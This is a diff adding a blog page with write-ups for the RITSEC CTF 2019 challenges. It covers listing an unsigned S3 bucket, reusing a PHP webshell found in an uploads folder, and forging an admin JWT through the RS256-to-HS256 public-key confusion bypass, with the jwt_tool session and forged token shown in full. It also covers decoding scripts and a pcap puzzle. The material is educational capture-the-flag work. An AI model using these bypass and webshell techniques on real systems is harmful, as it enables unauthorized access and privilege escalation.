@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+
+<meta name="description" content="A tasteful blog about Computer Security and cars. I break stuff unintentionally so you don&#39;t have to.">
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:domain" content="https://tasteofsecurity.com/">
+
+<meta name="twitter:image" content="https://tasteofsecurity.com/tn.png">
+<meta name="twitter:title" property="og:title" itemprop="title name" content="A taste of security">
+<meta name="twitter:description" property="og:description" itemprop="description" content="A tasteful blog about Computer Security and cars. I break stuff unintentionally so you don&#39;t have to.">
+<meta name="og:type" content="website">
+<meta name="og:url" content="https://tasteofsecurity.com/">
+<meta name="og:image" itemprop="image primaryImageOfPage" content="https://tasteofsecurity.com/tn.png">
+
+<link rel="shortcut icon" href="https://tasteofsecurity.com/sam.ico" id="favicon">
+<link rel="stylesheet" href="https://tasteofsecurity.com/css/style.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Didact+Gothic">
+
+    
+
+    
+    
+    
+    <title>
+        
+        RITSEC CTF 2019 Writeups: AWS S3, JWT, RCE ...
+        
+    </title>
+</head>
+
+<body>
+    <div class="wrap">
+        <div class="section" id="title">RITSEC CTF 2019 Writeups: AWS S3, JWT, RCE ...</div>
+
+        
+<div class="section" id="content">
+    Mon Nov 18, 2019  &#183; 6 min read
+    
+    <div class="tag-container">
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/web">
+                web
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/ctf">
+                ctf
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/jwt">
+                jwt
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/rce">
+                rce
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/aws-s3">
+                AWS S3
+            </a>
+        </span>
+        
+    </div>
+    
+    <hr/>
+    <h1 id="buckets-of-fun">Buckets of fun</h1>
+<p><img src="/images/ctf/ritsec/Untitled-3eb3dcf4-fc37-46cb-b2a4-8b19cecb7264.png" alt=""></p>
+<p>There&rsquo;s just some static HTML code at the challenge location. Reading the description suggest this is a AWS S3 misconfiguration.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ aws s3 ls s3://list-s3.scriptingis.life.ctf --no-sign-request
+2019-11-15 18:00:20        <span style="color:#ae81ff">630</span> index.html
+2019-11-15 18:00:20         <span style="color:#ae81ff">25</span> youfoundme-asd897kjm.txt
+
+$ aws s3 cp s3://list-s3.scriptingis.life.ctf/youfoundme-asd897kjm.txt - --no-sign-request
+RITSEC<span style="color:#f92672">{</span>LIST_HIDDEN_FILES<span style="color:#f92672">}</span>
+</code></pre></div><h1 id="potato">Potato</h1>
+<p><img src="/images/ctf/ritsec/Untitled-5c255fdb-1089-4ac9-a668-5a22a70737a4.png" alt=""></p>
+<p>When opening the challenge, there is not much.</p>
+<p>There&rsquo;s a comment that suggests there are some kind of upload or photos capability:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">article</span>&gt;
+....
+
+<span style="color:#75715e">&lt;!--</span><span style="color:#75715e"> upload and photos not yet linked </span><span style="color:#75715e">--&gt;</span>
+&lt;/<span style="color:#f92672">article</span>&gt;
+</code></pre></div><p>I try <code>/uploads</code> and there is a a lot of images. I figure that it&rsquo;s someone tried to get a shell on the server. A quick search for <code>&lt;?php</code> reveals the embedded shell that we can use to get RCE.</p>
+<ul>
+<li>Note: Since the file is not being interpreted as a PHP file, the php code is outputed as the file is being treated as text.</li>
+</ul>
+<p><img src="/images/ctf/ritsec/Untitled-520f8af9-0bb1-4a59-8040-b3c10126578e.png" alt=""></p>
+<p>We pick a file that have a <code>.php</code> file extension so the PHP code will get executed.</p>
+<p><img src="/images/ctf/ritsec/Untitled-fc74fb20-63fe-4ed4-9e07-18b80afef32f.png" alt=""></p>
+<p><img src="/images/ctf/ritsec/Untitled-339b2c10-ce40-4649-adef-0abcec712d89.png" alt=""></p>
+<p>TL;DR</p>
+<ol>
+<li>Find uploaded shell in <code>/uploads</code></li>
+<li>Steal shell</li>
+<li>Cat flag</li>
+</ol>
+<hr>
+<h1 id="our-first-api">Our First API</h1>
+<p><img src="/images/ctf/ritsec/Untitled-c2fab8a3-0e00-4256-afe8-38c46cf21a80.png" alt=""></p>
+<p>Opening the challenge we see:</p>
+<pre><code>This page is only for authentication with our api, located at port 4000!
+</code></pre>
+<p>When we go to port 4000 we get the following API documentation:</p>
+<p><img src="/images/ctf/ritsec/Untitled-8541e440-580a-4a16-995c-ff989b8d1c51.png" alt=""></p>
+<p>Let&rsquo;s fetch a token.</p>
+<pre><code>    GET /AUTH?name=fuc HTTP/1.1
+    Host: ctfchallenges.ritsec.club:3000
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/75.0.3770.90 Chrome/75.0.3770.90 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.9
+    Connection: close
+    
+    {&quot;token&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiZnVjIiwidHlwZSI6InVzZXIiLCJpYXQiOjE1NzM4NDI2MDh9.QYi3O0Lq8-aZ-p6YTMqHg09x33TXIkHX0M62vYHLY-GMc933En2h4s7rKtPfB6a55fmBPx5GknMP2LIcrnhhmufK7Pr8Z3TIPgqLO49A6__7hs3XImb03h55cZvpvYSZ3156Rh4inwxa1SR3jztYX8f_eRCa_-rmTxt0mON1bSs&quot;}
+</code></pre><p>We see that this is a <code>JWT</code> token.</p>
+<p><img src="/images/ctf/ritsec/Untitled-a37c2666-b325-42ec-85a2-39711df27151.png" alt=""></p>
+<p>We can confirm this by visiting <code>/API/NORMAL</code> and add a <code>Authorization</code>-header with the JWT token.</p>
+<p><img src="/images/ctf/ritsec/Untitled-04b324fb-684a-446b-85cc-d540ce5425fb.png" alt=""></p>
+<p>Now we need to elevate our privileges to admin. Burp found a public key. This suggest we will use the <code>RS256</code> to <code>HS256</code> bypass.</p>
+<p><img src="/images/ctf/ritsec/Untitled-7e1a8174-2a82-4380-8bbc-79c9cb019d2c.png" alt=""></p>
+<p>Save the public key as <code>key.key</code>. I&rsquo;m using this tool:</p>
+<ul>
+<li><a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></li>
+</ul>
+<pre><code>- $ python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiZnVjIiwidHlwZSI6InVzZXIiLCJpYXQiOjE1NzM4NDI2MDh9.QYi3O0Lq8-aZ-p6YTMqHg09x33TXIkHX0M62vYHLY-GMc933En2h4s7rKtPfB6a55fmBPx5GknMP2LIcrnhhmufK7Pr8Z3TIPgqLO49A6__7hs3XImb03h55cZvpvYSZ3156Rh4inwxa1SR3jztYX8f_eRCa_-rmTxt0mON1bSs
+
+  ,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
+  ----''----''----''----''----''----''----''----''----''----'
+       ,--.,--.   ,--.,--------.,--------.             ,--.
+       |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |
+  ,--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |
+  |  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |
+   `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'
+  ,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
+  '----''----''----''----''----''----''----''----''----''----'
+
+  Token header values:
+  [+] typ = JWT
+  [+] alg = RS256
+
+  Token payload values:
+  [+] name = fuc
+  [+] type = user
+  [+] iat = 1573842608
+
+  ######################################################
+
+  # Options:
+
+  # 1: Check CVE-2015-2951 - alg=None vulnerability
+
+  # 2: Check for Public Key bypass in RSA mode
+
+  # 3: Check signature against a key
+
+  # 4: Check signature against a key file (&quot;kid&quot;)
+
+  # 5: Crack signature with supplied dictionary file
+
+  # 6: Tamper with payload data (key required to sign)
+
+  # 0: Quit
+
+  ######################################################
+
+  Please make a selection (1-6)
+
+  &gt; 6
+
+  Token header values:
+  [1] typ = JWT
+  [2] alg = RS256
+  [3] *ADD A VALUE*
+  [0] Continue to next step
+
+  Please select a field number:
+  (or 0 to Continue)
+
+  &gt; 0
+
+  Token payload values:
+  [1] name = fuc
+  [2] type = user
+  [3] iat = 1573842608
+  [0] Continue to next step
+
+  Please select a field number:
+  (or 0 to Continue)
+
+  &gt; 2
+
+  Current value of type is: user
+  Please enter new value and hit ENTER
+
+  &gt; admin
+  &gt; [1] name = fuc
+  &gt; [2] type = admin
+  &gt; [3] iat = 1573842608
+  &gt; [0] Continue to next step
+
+  Please select a field number:
+  (or 0 to Continue)
+
+  &gt; 0
+
+  Token Signing:
+  [1] Sign token with known key
+  [2] Strip signature from token vulnerable to CVE-2015-2951
+  [3] Sign with Public Key bypass vulnerability
+  [4] Sign token with key file
+
+  Please select an option from above (1-4):
+
+  &gt; 3
+
+  Please enter the Public Key filename:
+
+  &gt; key.key
+  &gt; eyJuYW1lIjoiZnVjIiwidHlwZSI6ImFkbWluIiwiaWF0IjoxNTczODQyNjA4fQ
+
+  Set this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).
+  (This will only be valid on unpatched implementations of JWT.)
+
+  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiZnVjIiwidHlwZSI6ImFkbWluIiwiaWF0IjoxNTczODQyNjA4fQ.0kH-AMv_Uid7qbMeuuSQQSVbcZhkgFKbja1GLwCC4ZE
+
+
+</code></pre><p>We have now elevated our privileges to admin.</p>
+<p><img src="/images/ctf/ritsec/Untitled-b05d44d2-e39f-4eca-82c2-bc9961c6e0c6.png" alt=""></p>
+<p>Now we can access the <code>/API/ADMIN</code> endpoint.</p>
+<p><img src="/images/ctf/ritsec/Untitled-c1579bb4-6ff1-4995-962c-230a49175a27.png" alt=""></p>
+<h1 id="onion-layer-encoding">Onion Layer Encoding</h1>
+<p><img src="/images/ctf/ritsec/Untitled-a39aa114-c82e-4d5b-9ce7-565d4185494a.png" alt=""></p>
+<p>We get a file that is base64/base16/base32 encoded a lot of times. Psuedo code like this:</p>
+<pre><code>    base64(base64(base32(base16(RS{flag}))))
+</code></pre><p>Wrote a quick python script to decode with all possible permutations until the flag is returned.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64 
+<span style="color:#f92672">import</span> time
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag.txt</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">as</span> fp:
+    flag <span style="color:#f92672">=</span> fp<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">isprintable</span>(s, codec<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">utf8</span><span style="color:#e6db74">&#39;</span>):
+    <span style="color:#66d9ef">try</span>: s<span style="color:#f92672">.</span>decode(codec)
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">UnicodeDecodeError</span>: <span style="color:#66d9ef">return</span> False
+    <span style="color:#66d9ef">else</span>: <span style="color:#66d9ef">return</span> True
+
+
+permutation <span style="color:#f92672">=</span> [flag]
+<span style="color:#66d9ef">while</span>(True):
+    possible <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> permutation:
+        <span style="color:#66d9ef">try</span>:
+            x2 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b16decode(x,casefold<span style="color:#f92672">=</span>True)<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+            <span style="color:#66d9ef">if</span> isprintable(x2):
+                possible<span style="color:#f92672">.</span>append(x2)
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B16 OK at </span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(x2))
+            <span style="color:#66d9ef">else</span>:
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B16 fail1</span><span style="color:#e6db74">&#34;</span>)
+        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">b16 fail</span><span style="color:#e6db74">&#34;</span>)
+        <span style="color:#66d9ef">try</span>:
+            x3 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b32decode(x)<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+            <span style="color:#66d9ef">if</span> isprintable(x3):
+                possible<span style="color:#f92672">.</span>append(x3)
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B32 OK at </span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(x3))
+            <span style="color:#66d9ef">else</span>:
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">b32 fail1 </span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(x3))
+        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B32 fail</span><span style="color:#e6db74">&#34;</span>)
+        <span style="color:#66d9ef">try</span>:
+            x4 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(x)<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+            <span style="color:#66d9ef">if</span> isprintable(x4):
+                possible<span style="color:#f92672">.</span>append(x4)
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B64 OK at </span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(x4))
+            <span style="color:#66d9ef">else</span>:
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">b64 fail1</span><span style="color:#e6db74">&#34;</span>)
+        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">B64 fail</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">if</span> len(possible) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> x <span style="color:#f92672">is</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>:
+        <span style="color:#66d9ef">print</span>(x)
+        <span style="color:#66d9ef">break</span>
+    permutation <span style="color:#f92672">=</span> possible
+    possible <span style="color:#f92672">=</span> []
+
+</code></pre></div><pre><code>    b16 fail
+    B32 fail
+    B64 OK at 
+    B16 OK at 
+    B32 fail
+    b64 fail1
+    B16 OK at 
+    B32 fail
+    b64 fail1
+    b16 fail
+    B32 OK at 
+    b64 fail1
+    b16 fail
+    B32 fail
+    B64 OK at 
+    b16 fail
+    B32 OK at 
+    b64 fail1
+    b16 fail
+    B32 fail
+    B64 OK at 
+    B16 OK at 
+    B32 fail
+    b64 fail1
+    b16 fail
+    B32 fail
+    B64 OK at 
+    b16 fail
+    B32 fail
+    B64 OK at 
+    b16 fail
+    B32 OK at 
+    b64 fail1
+    b16 fail
+    B32 OK at 
+    b64 fail1
+    b16 fail
+    B32 fail
+    B64 OK at 
+    b16 fail
+    B32 fail
+    B64 OK at 
+    b16 fail
+    B32 OK at 
+    b64 fail1
+    B16 OK at 
+    B32 fail
+    b64 fail1
+    b16 fail
+    B32 fail
+    B64 OK at 
+    B16 OK at 
+    B32 fail
+    b64 fail1
+    b16 fail
+    B32 fail
+    B64 OK at 
+    b16 fail
+    B32 OK at 
+    b64 fail1
+    b16 fail
+    B32 fail
+    B64 OK at 
+    b16 fail
+    B32 OK at 
+    b64 fail1
+    b16 fail
+    B32 fail
+    B64 OK at 
+    b16 fail
+    B32 fail
+    B64 OK at 
+    B16 OK at 
+    B32 fail
+    b64 fail1
+    B16 OK at 
+    B32 fail
+    b64 fail1
+    b16 fail
+    B32 OK at 
+    b64 fail1
+    b16 fail
+    B32 OK at 
+    b64 fail1
+    b16 fail
+    B32 fail
+    B64 OK at 
+    B16 OK at 
+    B32 fail
+    b64 fail1
+    b16 fail
+    B32 fail
+    B64 OK at 
+    b16 fail
+    B32 OK at 
+    b64 fail1
+    b16 fail
+    B32 fail
+    b64 fail1
+    RITSEC{0n1On_L4y3R}
+</code></pre><h1 id="findme">findme</h1>
+<p><img src="/images/ctf/ritsec/Untitled-c2a8b622-3209-4357-97b8-85b4483475eb.png" alt=""></p>
+<p>This is a wireshark challenge. We open the <code>pcap</code> and find that there is communication to:</p>
+<ul>
+<li>18.219.169.113:1337</li>
+</ul>
+<p>nc to this IP and port reveals a base64 encoded string.</p>
+<pre><code>    nc 18.219.169.113 1337
+    H4sIAOKnx10AA+3OvQrCMADE8cx9ijxC0qbJKoiDq7qHaP0oSAltMonvbouLg+hURPj/lhvuhjtd
+    w1nMTI2sNVNqV6vXfDKl0FVttSsrp8ed1pVxQqq5j03ykEIvpcj73KX8Yfel/1Ob9W67Wt7iIcTB
+    q963yTdt0yV/WcR47O5F8euHAAAAAAAAAAAAAAAAAIB3HhZRz7sAKAAA
+</code></pre><p>When piping it to file we get a gzip.</p>
+<pre><code>    $ echo -n &quot;H4sIAOKnx10AA+3OvQrCMADE8cx9ijxC0qbJKoiDq7qHaP0oSAltMonvbouLg+hURPj/lhvuhjtd
+    w1nMTI2sNVNqV6vXfDKl0FVttSsrp8ed1pVxQqq5j03ykEIvpcj73KX8Yfel/1Ob9W67Wt7iIcTB
+    q963yTdt0yV/WcR47O5F8euHAAAAAAAAAAAAAAAAAIB3HhZRz7sAKAAA&quot; | base64 -d | file -
+    /dev/stdin: gzip compressed data, last modified: Sun Nov 10 06:02:10 2019, from Unix
+</code></pre><p>Extract it and we get the flag:</p>
+<p><code>RITSEC{pcaps_0r_it_didnt_h@ppen}</code></p>
+
+</div>
+
+
+        
+<div class="section bottom-menu">
+    
+<hr />
+<p>
+
+
+    
+        <a href="/security">back</a>
+        
+            &#183;
+        
+    
+    <a href="https://tasteofsecurity.com/">
+        #root
+    </a>
+    &#183; 
+    
+        
+            <a href="/security/">
+                A taste of security
+            </a>
+        
+    
+    
+        
+            &#183; 
+            <a href="/how-to/">
+                Break it, fix it.
+            </a>
+        
+            &#183; 
+            <a href="/about">
+                I&#39;m Hugo
+            </a>
+        
+    
+
+</p>
+
+</div>
+
+
+        <div class="section footer">© 2023 Hugo</div>
+    </div>
+</body>
+
+</html>
